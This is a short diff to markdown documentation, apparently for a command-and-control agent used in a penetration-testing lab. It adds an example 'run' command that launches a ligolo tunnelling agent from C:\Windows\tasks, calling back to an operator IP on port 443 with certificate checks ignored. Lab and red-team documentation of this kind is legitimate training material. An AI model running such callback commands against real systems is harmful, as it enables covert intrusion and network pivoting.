@@ -90,7 +90,7 @@ Self explanatory
 ## Run
 Runs an executable. A command might look like
 ```
-/prolab/cybernetic/ligolo
+run -Executable C:\Windows\tasks\ligolo-windows-agent.exe -Arguments "-connect 10.10.16.157:443 -ignore-cert"
 ```
 ## References
 https://redsiege.com/blog/2023/06/introduction-to-mythic-c2/
